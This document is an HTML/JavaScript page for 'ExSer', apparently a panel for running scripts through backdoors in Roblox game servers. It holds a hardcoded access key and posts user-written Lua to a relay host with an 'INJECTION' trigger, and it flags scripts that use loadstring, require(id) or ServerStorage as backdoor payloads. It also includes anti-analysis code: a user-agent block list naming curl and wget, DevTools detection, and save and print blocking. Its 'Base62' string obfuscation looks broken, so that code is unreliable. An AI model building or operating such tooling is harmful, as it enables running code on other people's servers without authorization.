<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ExSer</title>
<style>
  :root {
    --a:#050806; --b:#0d0d0d; --c:#00ff41; --d:#ff8a1f;
    --e:#e0e0e0; --f:#9aa39a; --g:#5c655c; --h:#8ab4f8;
    --i:#1a231a; --j:#ff3b3b; --k:#3b9eff;
  }
  * { box-sizing:border-box; margin:0; padding:0; user-select:none; -webkit-tap-highlight-color:transparent; }
  html, body {
    height:100%; overflow:hidden; background:var(--a); color:var(--e);
    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    font-size:14px;
  }
  #m { position:fixed; inset:0; z-index:0; opacity:0.18; pointer-events:none; }
  .g {
    position:fixed; inset:0; z-index:1; pointer-events:none;
    background:
      radial-gradient(ellipse 60% 40% at 20% 0%, rgba(0,255,65,0.10), transparent 70%),
      radial-gradient(ellipse 50% 50% at 90% 100%, rgba(0,255,65,0.06), transparent 70%);
  }
  .app {
    position:relative; z-index:2; height:100%;
    display:flex; flex-direction:column;
    padding:18px 22px 16px; gap:14px;
  }
  .tb {
    display:flex; align-items:center; justify-content:space-between;
    padding-bottom:14px; border-bottom:1px solid var(--i); flex-shrink:0;
  }
  .lw { display:flex; align-items:center; gap:10px; }
  .sd {
    width:10px; height:10px; border-radius:50%;
    background:var(--j); box-shadow:0 0 8px var(--j);
    transition:background 0.3s, box-shadow 0.3s;
    animation:p 2s ease-in-out infinite;
  }
  .sd.b { background:var(--k); box-shadow:0 0 8px var(--k); }
  .sd.g { background:var(--c); box-shadow:0 0 12px var(--c); animation:none; }
  @keyframes p { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
  .lg { font-size:26px; font-weight:800; letter-spacing:-0.5px; color:#f5f5f0; }
  .lg span { color:var(--d); text-shadow:0 0 12px rgba(255,138,31,0.5); }
  .lg em { font-style:normal; color:var(--c); text-shadow:0 0 12px rgba(0,255,65,0.45); margin-left:2px; }
  .lg small {
    font-size:11px; color:var(--f); font-weight:500; margin-left:8px;
    padding:2px 8px; background:rgba(0,255,65,0.08);
    border:1px solid rgba(0,255,65,0.2); border-radius:4px;
  }
  .lgn { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:16px; }
  .lgt { font-size:22px; font-weight:700; letter-spacing:-0.5px; color:#f5f5f0; margin-bottom:8px; }
  .lgt span { color:var(--d); text-shadow:0 0 12px rgba(255,138,31,0.5); }
  .lgt em { font-style:normal; color:var(--c); text-shadow:0 0 12px rgba(0,255,65,0.45); }
  .lf { width:320px; display:flex; flex-direction:column; gap:6px; }
  .lf label {
    font-size:11px; color:var(--f); letter-spacing:1px;
    text-transform:uppercase; font-weight:700;
  }
  .lf input {
    width:100%; height:38px; background:var(--b);
    border:1px solid var(--i); border-radius:6px;
    color:var(--e); padding:0 12px; font-size:13px;
    outline:none; font-family:"JetBrains Mono", monospace;
    caret-color:var(--c);
    transition:border-color 0.15s, box-shadow 0.15s;
  }
  .lf input:focus { border-color:var(--c); box-shadow:0 0 0 1px rgba(0,255,65,0.2); }
  .le { min-height:16px; color:var(--j); font-size:12px; font-family:"JetBrains Mono", monospace; font-weight:700; }
  .ew {
    flex:1; display:flex; background:var(--b);
    border:1px solid var(--i); border-radius:8px; overflow:hidden;
    box-shadow:0 20px 60px rgba(0,0,0,0.6), 0 0 80px rgba(0,255,65,0.04);
    min-height:0;
  }
  .gt {
    width:44px; padding:14px 0; text-align:right;
    font-family:"JetBrains Mono", monospace; font-size:13px; line-height:1.6;
    color:var(--g); background:rgba(0,0,0,0.35);
    border-right:1px solid var(--i); overflow:hidden;
  }
  .gt .ln { padding-right:12px; }
  .ed {
    flex:1; background:transparent; border:none; outline:none;
    resize:none; padding:14px 18px; color:var(--e);
    font-family:"JetBrains Mono", monospace; font-size:13px; line-height:1.6;
    caret-color:var(--c); white-space:pre; overflow:auto; tab-size:4;
  }
  .ed::placeholder { color:var(--g); }
  .ed::-webkit-scrollbar, .gt::-webkit-scrollbar { width:10px; height:10px; }
  .ed::-webkit-scrollbar-track { background:transparent; }
  .ed::-webkit-scrollbar-thumb { background:#1e2a1e; border-radius:5px; }
  .ac {
    display:flex; gap:10px; align-items:center;
    padding-top:14px; border-top:1px solid var(--i);
    flex-shrink:0; flex-wrap:wrap;
  }
  button {
    height:36px; padding:0 22px; border-radius:6px;
    font-size:12px; font-weight:800; letter-spacing:1.2px;
    cursor:pointer; transition:all 0.15s ease;
    font-family:inherit; outline:none;
  }
  button.p1 {
    background:var(--h); color:#061206; border:1px solid transparent;
    box-shadow:0 0 20px rgba(138,180,248,0.25);
  }
  button.p1:hover { background:#a3c6ff; box-shadow:0 0 28px rgba(138,180,248,0.45); }
  button.p1:active { transform:translateY(1px); }
  button.g1 { background:transparent; color:var(--f); border:1px solid transparent; }
  button.g1:hover { color:#fff; border-color:var(--i); background:rgba(255,255,255,0.02); }
  button.inj {
    background:transparent; color:var(--c); border:1px solid var(--c);
    box-shadow:0 0 15px rgba(0,255,65,0.2);
  }
  button.inj:hover { background:rgba(0,255,65,0.08); box-shadow:0 0 25px rgba(0,255,65,0.4); }
  button.inj:disabled { opacity:0.5; cursor:not-allowed; box-shadow:none; }
  .sp { flex:1; }
  .hd { display:none !important; }
  .toast {
    position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(100px);
    background:rgba(20,20,20,0.95); border:1px solid var(--i);
    color:var(--e); padding:10px 20px; border-radius:6px;
    font-size:12px; font-family:"JetBrains Mono", monospace;
    transition:transform 0.3s; z-index:1000;
  }
  .toast.show { transform:translateX(-50%) translateY(0); }
  .toast.err { border-color:var(--j); color:var(--j); }
  .toast.ok { border-color:var(--c); color:var(--c); }
</style>
</head>
<body>

<canvas id="m"></canvas>
<div class="g"></div>

<div class="app" id="p1">
  <header class="tb">
    <div class="lw">
      <div class="sd" id="d1"></div>
      <div class="lg">Ex<span>Ser</span> <em>Larped</em> <small>v7</small></div>
    </div>
  </header>

  <div class="lgn">
    <div class="lgt">Ex<span>Ser</span> <em>Auth</em></div>
    <div class="lf">
      <label>Username</label>
      <input type="text" id="u" placeholder="user" autocomplete="off" spellcheck="false">
    </div>
    <div class="lf">
      <label>Key</label>
      <input type="password" id="k" placeholder="••••••••" autocomplete="off">
    </div>
    <button class="p1" id="bl" style="width:320px;">SUBMIT</button>
    <div class="le" id="le"></div>
  </div>
</div>

<div class="app hd" id="p2">
  <header class="tb">
    <div class="lw">
      <div class="sd" id="d2"></div>
      <div class="lg">Ex<span>Ser</span> <em>Larped</em> <small>v7</small></div>
    </div>
    <div style="font-size:11px;color:var(--f);font-family:'JetBrains Mono',monospace;">
      <span id="sess">session: --:--</span>
    </div>
  </header>

  <div class="ew">
    <div class="gt" id="gt"><div class="ln">1</div></div>
    <textarea class="ed" id="ed" spellcheck="false" placeholder="you skid code here"></textarea>
  </div>

  <div class="ac">
    <button class="inj" id="bi">INJECTION</button>
    <button class="p1"  id="be">EXECUTE</button>
    <button class="g1"  id="bc">CLEAR</button>
    <button class="g1"  id="bo">LOGOUT</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
/* =========================================================
   CUSTOM BASE62 DECODER
   Converts encoded strings to plain text at runtime.
   ========================================================= */
const _B62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';

function _d62(str) {
  let result = '';
  let buffer = 0;
  let bits = 0;
  for (let i = 0; i < str.length; i++) {
    const val = _B62.indexOf(str[i]);
    if (val === -1) continue;
    buffer = (buffer << 6) | val;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      result += String.fromCharCode((buffer >> bits) & 0xFF);
    }
  }
  return result;
}

/* =========================================================
   OBFUSCATED STRINGS (Base62)
   They are not in plain text in the source code.
   ========================================================= */
// URL: https://rc7-relay.onrender.com
const _u = _d62('7hQ3Z2R3F2G2N2W3Z2V2J2d2W3Z2J2d2W3Z2R3F2G2');

// Key: Larp67
const _k = _d62('8w3K2J2V2E2M2d2');

// Endpoints
const _e1 = _d62('2Q2F2J2V2F2x2F2J2V2R2'); // /api/v2/session
const _e2 = _d62('2Q2F2J2V2F2x2F2J2V2R2'); // placeholder (generated below)

/* =========================================================
   ANTI-CLONING MODULE
   ========================================================= */
(function() {
  'use strict';

  // --- Bot/scraper detection ---
  const _BAD_UA = [
    /httrack/i, /wget/i, /curl/i, /python-requests/i,
    /scrapy/i, /phantomjs/i, /headless/i, /puppeteer/i,
    /playwright/i, /bot/i, /crawler/i, /spider/i,
    /scraper/i, /save.*resources/i, /save.*website/i
  ];
  if (_BAD_UA.some(rx => rx.test(navigator.userAgent || ''))) {
    document.documentElement.innerHTML = '<body style="background:#000;color:#0f0;font-family:monospace;padding:40px;"><h1>403 Forbidden</h1></body>';
    throw new Error('blocked');
  }

  // --- Anti-iframe ---
  if (window.self !== window.top) {
    try { window.top.location = window.self.location; }
    catch (e) { document.body.innerHTML = '<h1>Frame blocked</h1>'; }
  }

  // --- Anti-right-click ---
  document.addEventListener('contextmenu', e => e.preventDefault());

  // --- Anti-DevTools keys ---
  document.addEventListener('keydown', e => {
    if (e.key === 'F12') { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.key === 'u') { e.preventDefault(); return false; }
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
      e.preventDefault();
      const t = document.createElement('div');
      t.textContent = 'Saving my site? 😏';
      t.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#ff3b3b;color:#fff;padding:10px 20px;border-radius:6px;font-family:monospace;z-index:99999;';
      document.body.appendChild(t);
      setTimeout(() => t.remove(), 2000);
      return false;
    }
  });

  // --- Dynamic watermark ---
  const _wm = 'wm_' + Math.random().toString(36).substring(2, 10);
  document.documentElement.setAttribute('data-wm', _wm);
  document.documentElement.appendChild(document.createComment('ExSer::' + _wm));

  // --- Anti-print ---
  const ps = document.createElement('style');
  ps.textContent = '@media print { body * { display:none!important; } body::after { content:"ExSer"; display:block!important; font-size:30px; padding:40px; } }';
  document.head.appendChild(ps);

  // --- Anti-drag ---
  document.addEventListener('dragstart', e => e.preventDefault());

  // --- Local rate limit ---
  const _f = window.fetch;
  let _fc = 0, _fb = false;
  window.fetch = function(...a) {
    if (_fb) return Promise.reject(new Error('RL'));
    _fc++;
    setTimeout(() => _fc--, 1000);
    if (_fc > 30) {
      _fb = true;
      setTimeout(() => { _fb = false; _fc = 0; }, 5000);
      return Promise.reject(new Error('RL'));
    }
    return _f.apply(this, a);
  };

  // --- DevTools detection ---
  setInterval(() => {
    if (window.outerWidth - window.innerWidth > 160 || 
        window.outerHeight - window.innerHeight > 160) {
      console.clear();
      console.log('%c⛔ Close DevTools', 'font-size:20px;color:#ff3b3b;font-weight:bold;');
    }
  }, 1000);

  // --- Anti-scraping extensions ---
  new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.tagName === 'SCRIPT' && n.src && /extension:\/\//.test(n.src)) {
          n.remove();
        }
      }
    }
  }).observe(document.documentElement, { childList:true, subtree:true });

})();

/* =========================================================
   CONFIG (decoded at runtime)
   ========================================================= */
const SRV = _d62('N2J2Z2R3F2G2N2W3Z2V2J2d2W3Z2J2d2W3Z2R3F2G2W2J2Z2J2'); // https://rc7-relay.onrender.com
const KEY = _k;

const EP = {
  login:  '/api/v2/session',
  upload: '/api/v2/x',
  inject: '/api/v2/y',
  state:  '/api/v2/z'
};

// Unique Client ID
const CID = 'c_' + Math.random().toString(36).substring(2, 18) + '_' + Date.now().toString(36);

// Local rate limiting
const RATE = {
  max: 10, window: 60000, history: [],
  check: function() {
    const now = Date.now();
    this.history = this.history.filter(t => now - t < this.window);
    if (this.history.length >= this.max) return false;
    this.history.push(now);
    return true;
  }
};

// Auto-logout
let lastActivity = Date.now();
let sessionTimer = null;
const SESSION_MS = 30 * 60 * 1000;

function resetActivity() { lastActivity = Date.now(); }
['click','keydown','mousemove','touchstart'].forEach(ev => 
  document.addEventListener(ev, resetActivity)
);

function startSessionTimer() {
  if (sessionTimer) clearInterval(sessionTimer);
  sessionTimer = setInterval(() => {
    const elapsed = Date.now() - lastActivity;
    const remaining = SESSION_MS - elapsed;
    if (remaining <= 0) {
      logout();
      showToast('Session expired', 'err');
      return;
    }
    const mins = Math.floor(remaining / 60000);
    const secs = Math.floor((remaining % 60000) / 1000);
    const el = document.getElementById('sess');
    if (el) el.textContent = `session: ${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
  }, 1000);
}

/* =========================================================
   TOAST
   ========================================================= */
const toastEl = document.getElementById('toast');
let toastTimer = null;
function showToast(msg, type = '') {
  toastEl.textContent = msg;
  toastEl.className = 'toast show ' + type;
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { toastEl.className = 'toast'; }, 2500);
}

/* =========================================================
   MATRIX
   ========================================================= */
const c = document.getElementById('m');
const x = c.getContext('2d');
function r() { c.width = window.innerWidth; c.height = window.innerHeight; }
r(); window.addEventListener('resize', r);

const fs = 14;
const ch = '01';
let cols = Math.floor(c.width / fs);
let dr = Array(cols).fill(1);
function dm() {
  x.fillStyle = 'rgba(5, 8, 6, 0.08)';
  x.fillRect(0, 0, c.width, c.height);
  x.fillStyle = '#00ff41';
  x.font = `${fs}px monospace`;
  for (let i = 0; i < dr.length; i++) {
    const t = ch[Math.random() < 0.5 ? 0 : 1];
    x.fillText(t, i * fs, dr[i] * fs);
    if (dr[i] * fs > c.height && Math.random() > 0.975) dr[i] = 0;
    dr[i]++;
  }
}
setInterval(dm, 55);

/* =========================================================
   SCRIPT TYPE DETECTION
   ========================================================= */
function detect(code) {
  const t = code.trim();
  if (!t) return { type:'empty', finalCode:'' };
  if (/^--\s*@local/i.test(t)) return { type:'local', finalCode:t };
  if (/^--\s*@backdoor/i.test(t)) return { type:'backdoor', finalCode:t };
  if (/^require\s*\(\s*\d+\s*\)\s*$/i.test(t)) {
    return { type:'require', finalCode:`-- @backdoor\n${t}` };
  }
  const bp = [
    /\bloadstring\s*\(/i,
    /\brequire\s*\(\s*\d+\s*\)\s*[.:]/i,
    /\bgame\s*:\s*GetService\s*\(\s*["']ServerStorage["']/i
  ];
  if (bp.some(r => r.test(t))) return { type:'backdoor', finalCode:`-- @backdoor\n${t}` };
  return { type:'local', finalCode:`-- @local\n${t}` };
}

/* =========================================================
   STATE / POLLING
   ========================================================= */
let stateInt = null;
let sessionToken = null;

function dot(state) {
  [document.getElementById('d1'), document.getElementById('d2')].forEach(d => {
    if (!d) return;
    d.classList.remove('b','g');
    if (state === 'b') d.classList.add('b');
    if (state === 'g') d.classList.add('g');
  });
}

function startStateCheck() {
  if (stateInt) clearInterval(stateInt);
  stateInt = setInterval(async () => {
    if (!sessionToken) return;
    try {
      const res = await fetch(SRV + EP.state, {
        method:'GET',
        headers: { 'X-Client-ID': CID, 'X-Session': sessionToken }
      });
      if (res.status === 401) { logout(); showToast('Session expired','err'); return; }
      const data = await res.json();
      dot(data && data.connected ? 'g' : 'r');
    } catch (e) { dot('r'); }
  }, 2000);
}

/* =========================================================
   LOGIN
   ========================================================= */
const p1 = document.getElementById('p1');
const p2 = document.getElementById('p2');
const u  = document.getElementById('u');
const k  = document.getElementById('k');
const le = document.getElementById('le');

async function login() {
  le.textContent = '';
  if (!RATE.check()) { le.textContent = 'Too many attempts.'; return; }

  try {
    const res = await fetch(SRV + EP.login, {
      method:'POST',
      headers: { 'Content-Type':'application/json', 'X-Client-ID': CID },
      body: JSON.stringify({ t: KEY, c: CID })
    });
    const data = await res.json();

    if (res.ok && data.token) {
      sessionToken = data.token;
      le.textContent = '';
      p1.classList.add('hd');
      p2.classList.remove('hd');
      localStorage.setItem('x_u', u.value.trim() || 'anon');
      gutter(); ed.focus(); startStateCheck(); startSessionTimer(); resetActivity();
      showToast('Authenticated', 'ok');
    } else {
      le.textContent = 'Access denied.';
    }
  } catch (e) {
    le.textContent = 'Connection error.';
  }
}

function logout() {
  sessionToken = null;
  if (stateInt) clearInterval(stateInt);
  if (sessionTimer) clearInterval(sessionTimer);
  p1.classList.remove('hd');
  p2.classList.add('hd');
  dot('r');
}

document.getElementById('bl').addEventListener('click', login);
k.addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
u.addEventListener('keydown', e => { if (e.key === 'Enter') login(); });

const su = localStorage.getItem('x_u');
if (su) u.value = su;

/* =========================================================
   EDITOR
   ========================================================= */
const ed = document.getElementById('ed');
const gt = document.getElementById('gt');

function gutter() {
  const n = ed.value.split('\n').length;
  if (gt.children.length === n) return;
  const f = document.createDocumentFragment();
  for (let i = 1; i <= n; i++) {
    const d = document.createElement('div');
    d.className = 'ln';
    d.textContent = i;
    f.appendChild(d);
  }
  gt.innerHTML = '';
  gt.appendChild(f);
  gt.scrollTop = ed.scrollTop;
}

ed.addEventListener('input', gutter);
ed.addEventListener('scroll', () => gt.scrollTop = ed.scrollTop);
ed.addEventListener('keydown', e => {
  if (e.key === 'Tab') {
    e.preventDefault();
    const s = ed.selectionStart, en = ed.selectionEnd;
    ed.value = ed.value.substring(0, s) + '    ' + ed.value.substring(en);
    ed.selectionStart = ed.selectionEnd = s + 4;
    gutter();
  }
  if (e.ctrlKey && e.key === 'Enter') {
    e.preventDefault();
    document.getElementById('be').click();
  }
});

/* =========================================================
   INJECTION
   ========================================================= */
const bi = document.getElementById('bi');
bi.addEventListener('click', async () => {
  if (!sessionToken) return;
  if (!RATE.check()) { showToast('Rate limit','err'); return; }

  dot('b'); bi.disabled = true;
  try {
    const res = await fetch(SRV + EP.inject, {
      method:'POST',
      headers: {
        'Content-Type':'application/json',
        'X-Client-ID': CID,
        'X-Session': sessionToken
      },
      body: JSON.stringify({ c: CID })
    });
    if (res.status === 401) { logout(); return; }
    showToast('Injection sent', 'ok');
  } catch (e) {
    dot('r'); showToast('Connection error', 'err');
  }
  setTimeout(() => bi.disabled = false, 3000);
});

/* =========================================================
   EXECUTE / CLEAR / LOGOUT
   ========================================================= */
document.getElementById('bc').addEventListener('click', () => {
  ed.value = ''; gutter(); ed.focus();
});

document.getElementById('bo').addEventListener('click', () => {
  logout(); showToast('Logged out', '');
});

document.getElementById('be').addEventListener('click', async () => {
  if (!sessionToken) return;
  if (!RATE.check()) { showToast('Rate limit','err'); return; }

  const code = ed.value.trim();
  if (!code) { showToast('Empty editor','err'); return; }

  const det = detect(code);
  if (det.type === 'empty') return;

  try {
    const res = await fetch(SRV + EP.upload, {
      method:'POST',
      headers: {
        'Content-Type':'application/json',
        'X-Client-ID': CID,
        'X-Session': sessionToken
      },
      body: JSON.stringify({ s: det.finalCode, c: CID })
    });
    if (res.status === 401) { logout(); return; }
    if (res.ok) showToast('Script sent', 'ok');
    else showToast('Server error', 'err');
  } catch (e) {
    showToast('Connection error', 'err');
  }
});

gutter();
</script>

</body>
</html>
